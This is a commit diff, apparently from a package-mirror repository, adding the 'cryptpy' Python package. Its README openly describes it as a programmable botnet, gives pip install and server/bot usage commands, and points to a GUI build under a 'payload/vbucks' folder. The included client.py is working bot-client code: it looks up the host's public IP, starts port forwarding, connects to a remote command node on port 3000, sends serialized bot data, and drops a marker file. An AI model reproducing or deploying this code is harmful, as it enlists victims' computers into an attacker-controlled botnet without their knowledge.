4ef9558f2c07320aef9fba6890c112124247d7aa
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 11:52:12 +0000

    Add package cryptpy/0.3.7/cryptpy-0.3.7.tar.gz

---
+++ packages/cryptpy/cryptpy-0.3.7.tar.gz/cryptpy-0.3.7/README.md
@@ -0,0 +1,46 @@
+![Logo](http://mattnappo.com/crypt.png)
+
+[![Build Status](https://travis-ci.com/mitsukomegumi/CryptPy.js.svg?branch=master)](https://travis-ci.com/mitsukomegumi/CryptPy.js)
+___
+
+Dynamically programmable Python botnet (educational purposes only).
+
+## Installation
+
+### Core Installation with PIP (botnet sources)
+
+```BASH
+pip install cryptpy
+```
+
+### Building the Node Source (GUI Implementation)
+
+Note: requires installation of cryptpy
+
+First, `cd payload/vbucks`.
+
+Build for MacOS:
+
+1. `npm i`
+
+2. `yarn dist`
+
+Build for Windows:
+
+1. `npm i`
+
+2. `npm run dist`
+
+## Usage
+
+Start a Server:
+
+```bash
+cryptpy --server --terminal
+```
+
+Start and Register a Bot:
+
+```bash
+cryptpy
+```
---
+++ packages/cryptpy/cryptpy-0.3.7.tar.gz/cryptpy-0.3.7/src/networking/client.py
@@ -0,0 +1,68 @@
+import socket
+import sys
+import os
+import threading
+import ipgetter
+from src.common import common
+from src.common import commonio
+from src.bot import bot
+from src.common.commondefs import false
+from src.common.commondefs import true
+from src.common.commondefs import none
+
+class Client:
+    def __init__(self, botRef: bot.Bot, remoteAddr):
+        self.bot = bot.Bot
+
+        if remoteAddr == "" or remoteAddr is none:
+            self.hostNode = common.RemoteAddr # Set host node addr for persistency
+        else:
+            self.hostNode = remoteAddr
+
+        self.bot.host = botRef.host # Set host for persistency
+        self.ip = ipgetter.myip() # Check IP
+
+        if os.path.isfile('bot.hax') == false or botRef.host != self.ip:
+            if botRef.host != self.ip: # Check for new IP
+                self.bot.host = self.ip # Register new IP
+
+            self.RegisterClient() # Register client
+    
+    def RegisterClient(self):
+        print('\n-- INFO -- registering client...\n') # Log begin
+
+        if self.hostNode == '': # Check for nil host node
+            return 'invalid host node' # Return error
+        
+        try:
+            portThread = threading.Thread(target=common.forwardPortStandard) # Init port thread
+            portThread.daemon = true # Run as background thread
+            portThread.start() # Start port forwarding thread
+        except Exception as e:
+            print(e) # Log found error
+
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Init socket
+
+        sock.connect((self.hostNode, 3000)) # Connect socket
+
+        print('-- CONNECTION -- connecting to host node with bot address '+self.bot.host)
+
+        bot = self.bot # Get reference to bot
+
+        serialized = bot.params_to_bytes(bot) # Attempt to serialize
+
+        print('serialized bot data')
+
+        sock.sendall(serialized) # Send self bot reference
+
+        print('attempted to send '+str(len(serialized))+' bits of data') # Log send
+
+        sock.close() # Close socket
+
+        print('successfully wrote '+str(len(serialized))+' bits of data') # Log success
+
+        print('-- CONNECTION-- closing connection\n')
+
+        f = open('bot.hax', 'w') # Open file
+
+        f.write('despacito') # Write success
